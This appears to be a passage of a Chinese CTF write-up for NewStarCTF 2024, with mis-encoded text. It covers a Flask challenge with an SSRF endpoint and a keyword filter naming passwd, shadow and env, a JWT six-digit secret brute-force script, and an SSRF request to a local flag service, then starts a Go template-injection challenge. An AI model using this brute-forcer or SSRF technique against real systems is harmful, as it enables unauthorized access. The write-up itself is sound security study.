</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="n">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">api_address</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;api_address&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">api_address</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;No api address!&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">api_address</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/api&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">api</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="n">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Server Info: {os.popen(&#39;uname -a&#39;).read()}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Credentials&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/&lt;path:file&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">static_file</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">restricted_keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;proc&#34;</span><span class="p">,</span> <span class="s2">&#34;env&#34;</span><span class="p">,</span> <span class="s2">&#34;passwd&#34;</span><span class="p">,</span> <span class="s2">&#34;shadow&#34;</span><span class="p">,</span> <span class="s2">&#34;hosts&#34;</span><span class="p">,</span> <span class="s2">&#34;sys&#34;</span><span class="p">,</span> <span class="s2">&#34;log&#34;</span><span class="p">,</span> <span class="s2">&#34;etc&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                           <span class="s2">&#34;bin&#34;</span><span class="p">,</span> <span class="s2">&#34;lib&#34;</span><span class="p">,</span> <span class="s2">&#34;tmp&#34;</span><span class="p">,</span> <span class="s2">&#34;var&#34;</span><span class="p">,</span> <span class="s2">&#34;run&#34;</span><span class="p">,</span> <span class="s2">&#34;dev&#34;</span><span class="p">,</span> <span class="s2">&#34;home&#34;</span><span class="p">,</span> <span class="s2">&#34;boot&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">any</span><span class="p">(</span><span class="n">keyword</span> <span class="ow">in</span> <span class="n">file</span> <span class="k">for</span> <span class="n">keyword</span> <span class="ow">in</span> <span class="n">restricted_keywords</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;STOP!&#34;</span><span class="p">,</span> <span class="mi">404</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;./static/&#34;</span> <span class="o">+</span> <span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Not found!&#34;</span><span class="p">,</span> <span class="mi">404</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&#34;./static/&#34;</span> <span class="o">+</span> <span class="n">file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æœ‰ä¸ªflag.py,ä¹Ÿé€šè¿‡è·¯å¾„è¯»å–</p>
<p><img src="/p/newstarctf2024/image-20250705163112326.png"
	width="1996"
	height="868"
	srcset="/p/newstarctf2024/image-20250705163112326_hu4719397447041308425.png 480w, /p/newstarctf2024/image-20250705163112326_hu13730765523317750222.png 1024w"
	loading="lazy"
	
		alt="image-20250705163112326"
	
	
		class="gallery-image" 
		data-flex-grow="229"
		data-flex-basis="551px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask
</span></span><span class="line"><span class="cl">import os
</span></span><span class="line"><span class="cl">import random
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def get_random_number_string(length):
</span></span><span class="line"><span class="cl">    return &#39;&#39;.join([str(random.randint(0, 9)) for _ in range(length)])
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">get_flag = Flask(&#34;get_flag&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">FLAG = os.environ.pop(&#34;ICQ_FLAG&#34;, &#34;flag{test_flag}&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@get_flag.route(&#34;/fl4g&#34;)
</span></span><span class="line"><span class="cl">#å¦‚ä½•è§¦å‘å®ƒå‘¢?
</span></span><span class="line"><span class="cl">def flag():
</span></span><span class="line"><span class="cl">    return FLAG
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
</span></span><span class="line"><span class="cl">    get_flag.run(host=&#34;127.0.0.1&#34;,port=5001)
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œæ„Ÿè§‰æ˜¯éœ€è¦ä¼ªé€ JWTåï¼Œåˆ©ç”¨ <code>/execute</code> è·¯ç”±çš„ SSRF æ¼æ´è®©æœåŠ¡å™¨è‡ªå·±è®¿é—® <code>http://localhost:5001/fl4g</code>ï¼Œå³è®¿é—® <code>/execute?api_address=http://localhost:5001/fl4g</code></p>
<p>ç„¶åè¿™é‡ŒJWTæ˜¯éœ€è¦å¯†é’¥äº†ï¼Œåœ¨ç¯å¢ƒå˜é‡é‡Œåº”è¯¥å¯ä»¥è¯»å‡ºæ¥ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªæ–¹æ³•è¢«banäº†ã€‚</p>
<p>åæ¥å‘ç°æœ‰ä¸ª&rsquo;amiya&rsquo;: &ldquo;114514&rdquo;ï¼Œæ˜æ–‡å­˜å‚¨è´¦å·äº†ï¼Œå°è¯•ç™»å½•ï¼Œç™»å½•æˆåŠŸ</p>
<p><img src="/p/newstarctf2024/image-20250705161623396.png"
	width="625"
	height="232"
	srcset="/p/newstarctf2024/image-20250705161623396_hu17679478103512682586.png 480w, /p/newstarctf2024/image-20250705161623396_hu16994028519933699440.png 1024w"
	loading="lazy"
	
		alt="image-20250705161623396"
	
	
		class="gallery-image" 
		data-flex-grow="269"
		data-flex-basis="646px"
	
></p>
<p>è¿™ä¸ªæ—¶å€™æŠ“åŒ…å¯ä»¥å‘ç°å¤šäº†ä¸€ä¸ªtokenï¼Œå°±æ˜¯JWTï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•JWTçˆ†ç ´äº†ï¼Œ</p>
<p>ç”¨å·¥å…·æ²¡çˆ†å‡ºæ¥ï¼Œå‘ç°ä»£ç </p>
<p><img src="/p/newstarctf2024/image-20250705164116895.png"
	width="527"
	height="58"
	srcset="/p/newstarctf2024/image-20250705164116895_hu12406217615691761248.png 480w, /p/newstarctf2024/image-20250705164116895_hu12861088247152710721.png 1024w"
	loading="lazy"
	
		alt="image-20250705164116895"
	
	
		class="gallery-image" 
		data-flex-grow="908"
		data-flex-basis="2180px"
	
></p>
<p>æ‰€ä»¥å¯†é’¥å°±æ˜¯å…­ä½å¯†ç ï¼Œå¯ä»¥å†™ä¸ªè„šæœ¬çˆ†ç ´ï¼Œç”¨aiå†™ä¸ªè„šæœ¬ï¼Œæ•´çš„æŒºå¥½çœ‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import jwt
</span></span><span class="line"><span class="cl">import time
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># ç›´æ¥æŒ‡å®šç›®æ ‡JWTä»¤ç‰Œ
</span></span><span class="line"><span class="cl">TARGET_TOKEN = &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW1peWEiLCJleHAiOjE3NTE3MDM4OTZ9.qAvSETNWgds285Hsp41v4fTvhAga5rcNURlll_Zgsbw&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def brute_force_jwt(token):
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;
</span></span><span class="line"><span class="cl">    æš´åŠ›ç ´è§£6ä½æ•°å­—JWTå¯†é’¥
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;
</span></span><span class="line"><span class="cl">    print(f&#34;[*] å¼€å§‹çˆ†ç ´JWTå¯†é’¥...&#34;)
</span></span><span class="line"><span class="cl">    print(f&#34;[*] ç›®æ ‡ä»¤ç‰Œ: {token}&#34;)
</span></span><span class="line"><span class="cl">    print(f&#34;[*] å¯†é’¥èŒƒå›´: 000000 åˆ° 999999&#34;)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    start_time = time.time()
</span></span><span class="line"><span class="cl">    found = False
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    # å°è¯•æ‰€æœ‰6ä½æ•°å­—ç»„åˆ
</span></span><span class="line"><span class="cl">    for i in range(1000000):
</span></span><span class="line"><span class="cl">        # æ ¼å¼åŒ–ä¸º6ä½æ•°å­—ï¼ˆå‰å¯¼é›¶ï¼‰
</span></span><span class="line"><span class="cl">        secret_key = str(i).zfill(6)
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        try:
</span></span><span class="line"><span class="cl">            # å°è¯•ç”¨å½“å‰å¯†é’¥è§£ç ä»¤ç‰Œ
</span></span><span class="line"><span class="cl">            decoded = jwt.decode(
</span></span><span class="line"><span class="cl">                token, 
</span></span><span class="line"><span class="cl">                secret_key, 
</span></span><span class="line"><span class="cl">                algorithms=[&#34;HS256&#34;],
</span></span><span class="line"><span class="cl">                options={&#34;verify_exp&#34;: False}  # å¿½ç•¥è¿‡æœŸéªŒè¯
</span></span><span class="line"><span class="cl">            )
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            # è®¡ç®—è€—æ—¶
</span></span><span class="line"><span class="cl">            elapsed = time.time() - start_time
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            print(f&#34;\n[+] æˆåŠŸæ‰¾åˆ°å¯†é’¥! ğŸ‰&#34;)
</span></span><span class="line"><span class="cl">            print(f&#34;[+] å¯†é’¥: {secret_key}&#34;)
</span></span><span class="line"><span class="cl">            print(f&#34;[+] è€—æ—¶: {elapsed:.2f}ç§’&#34;)
</span></span><span class="line"><span class="cl">            print(f&#34;[+] è§£ç å†…å®¹: {decoded}&#34;)
</span></span><span class="line"><span class="cl">            found = True
</span></span><span class="line"><span class="cl">            break
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        except jwt.InvalidSignatureError:
</span></span><span class="line"><span class="cl">            # æ¯10000æ¬¡æ˜¾ç¤ºè¿›åº¦
</span></span><span class="line"><span class="cl">            if i % 10000 == 0:
</span></span><span class="line"><span class="cl">                progress = i / 10000
</span></span><span class="line"><span class="cl">                print(f&#34;\r[*] å°è¯•ä¸­... {i:06d}/999999 ({progress}%)&#34;, end=&#34;&#34;, flush=True)
</span></span><span class="line"><span class="cl">        except jwt.ExpiredSignatureError:
</span></span><span class="line"><span class="cl">            # ä»¤ç‰Œè¿‡æœŸä½†ç­¾åæ­£ç¡®
</span></span><span class="line"><span class="cl">            print(f&#34;\n[+] æ‰¾åˆ°å¯†é’¥! (ä»¤ç‰Œå·²è¿‡æœŸ)&#34;)
</span></span><span class="line"><span class="cl">            print(f&#34;[+] å¯†é’¥: {secret_key}&#34;)
</span></span><span class="line"><span class="cl">            print(f&#34;[+] è§£ç å†…å®¹: {decoded}&#34;)
</span></span><span class="line"><span class="cl">            found = True
</span></span><span class="line"><span class="cl">            break
</span></span><span class="line"><span class="cl">        except Exception as e:
</span></span><span class="line"><span class="cl">            print(f&#34;\n[!] å¯†é’¥ {secret_key} å‡ºç°é”™è¯¯: {str(e)}&#34;)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    if not found:
</span></span><span class="line"><span class="cl">        print(&#34;\n[!] æœªæ‰¾åˆ°åŒ¹é…çš„å¯†é’¥ï¼Œå¯èƒ½å¯†é’¥ä¸åœ¨0-999999èŒƒå›´å†…&#34;)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    print(&#34;\n[*] çˆ†ç ´å®Œæˆ&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
</span></span><span class="line"><span class="cl">    # æ˜¾ç¤ºASCIIè‰ºæœ¯æ ‡é¢˜
</span></span><span class="line"><span class="cl">    print(r&#34;&#34;&#34;
</span></span><span class="line"><span class="cl">  _      ____  _______  ______ _____  _____ 
</span></span><span class="line"><span class="cl"> | |    / __ \|  __ \ \ \ \  |_   _|/ ____|
</span></span><span class="line"><span class="cl"> | |   | |  | | |__) | \ \ \   | | | (___  
</span></span><span class="line"><span class="cl"> | |   | |  | |  _  /   \ \ \  | |  \___ \ 
</span></span><span class="line"><span class="cl"> | |___| |__| | | \ \    \ \ \_| |_ ____) |
</span></span><span class="line"><span class="cl"> |______\____/|_|  \_\    \_\__\___|_____/ 
</span></span><span class="line"><span class="cl">    JWTå¯†é’¥çˆ†ç ´å·¥å…· - 6ä½æ•°å­—å¯†é’¥æš´åŠ›ç ´è§£                                        
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    # æ‰§è¡Œçˆ†ç ´
</span></span><span class="line"><span class="cl">    brute_force_jwt(TARGET_TOKEN)
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250705164845405.png"
	width="1340"
	height="1044"
	srcset="/p/newstarctf2024/image-20250705164845405_hu14148958902326878901.png 480w, /p/newstarctf2024/image-20250705164845405_hu9740827074369948165.png 1024w"
	loading="lazy"
	
		alt="image-20250705164845405"
	
	
		class="gallery-image" 
		data-flex-grow="128"
		data-flex-basis="308px"
	
></p>
<p>æˆåŠŸç™»å…¥admin</p>
<p><img src="/p/newstarctf2024/image-20250705170259378.png"
	width="1538"
	height="455"
	srcset="/p/newstarctf2024/image-20250705170259378_hu14057993493357562329.png 480w, /p/newstarctf2024/image-20250705170259378_hu14248046647700618876.png 1024w"
	loading="lazy"
	
		alt="image-20250705170259378"
	
	
		class="gallery-image" 
		data-flex-grow="338"
		data-flex-basis="811px"
	
></p>
<p>ç„¶åæ‰“ssrfï¼Œè¿™é‡Œå› ä¸ºflagåªåœ¨127.0.0.1:5001è¿è¡Œï¼Œæ‰€ä»¥ç›´æ¥æ‰“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">execute?api_address=http://127.0.0.1:5001/fl4g
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250705171055400.png"
	width="1723"
	height="406"
	srcset="/p/newstarctf2024/image-20250705171055400_hu4654240565485722477.png 480w, /p/newstarctf2024/image-20250705171055400_hu17422336194476383172.png 1024w"
	loading="lazy"
	
		alt="image-20250705171055400"
	
	
		class="gallery-image" 
		data-flex-grow="424"
		data-flex-basis="1018px"
	
></p>
<p>è¿™é‡Œæ—¶é—´æˆ³ä¸å¯¹çš„è¯cookieè®¤è¯è¿˜æ˜¯ä¼šå¤±è´¥ï¼Œæ‰€ä»¥è¿˜æŒºéš¾æ‰‹æ“çš„ã€‚</p>
<p>å®¡è®¡pythonä»£ç çš„èƒ½åŠ›è¿˜æ˜¯å¾ˆé‡è¦çš„ï¼Œè¿™é‡Œflag.pyçš„å­˜åœ¨ã€flag.pyçš„è¿è¡Œç«¯å£ã€JWTå¯†é’¥æ˜¯å…­ä½æ•°å­—ã€æ™®é€šè´¦å·çš„å­˜åœ¨ã€‚éƒ½æ˜¯å¾ˆé‡è¦çš„ç¯èŠ‚ï¼Œéœ€è¦å¯¹ä»£ç å¾ˆç†Ÿæ‚‰ã€‚</p>
<h2 id="week4">Week4
</h2><h3 id="pangbai-è¿‡å®¶å®¶4">PangBai è¿‡å®¶å®¶ï¼ˆ4ï¼‰
</h3><h4 id="çŸ¥è¯†ç‚¹goæ¨¡æ¿æ³¨å…¥goä»£ç å®¡è®¡jwtä¼ªé€ ssrf">çŸ¥è¯†ç‚¹ï¼šgoæ¨¡æ¿æ³¨å…¥ã€goä»£ç å®¡è®¡ã€JWTä¼ªé€ ã€SSRF
</h4><p>ç»™äº†æºç ï¼Œç”¨goè¯­è¨€å†™çš„ï¼Œçœ‹main.go</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/gorilla/mux&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;io/ioutil&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;os/exec&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;strings&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;text/template&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">Token</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Stringer</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Name</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">Config</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Stringer</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Name</span>          <span class="kt">string</span>
</span></span><span class="line"><span class="cl">	<span class="nx">JwtKey</span>        <span class="kt">string</span>
</span></span><span class="line"><span class="cl">	<span class="nx">SignaturePath</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">Helper</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Stringer</span>
</span></span><span class="line"><span class="cl">	<span class="nx">User</span>   <span class="kt">string</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Config</span> <span class="nx">Config</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">config</span> <span class="p">=</span> <span class="nx">Config</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Name</span><span class="p">:</span>          <span class="s">&#34;PangBai è¿‡å®¶å®¶ (4)&#34;</span><span class="p">,</span>
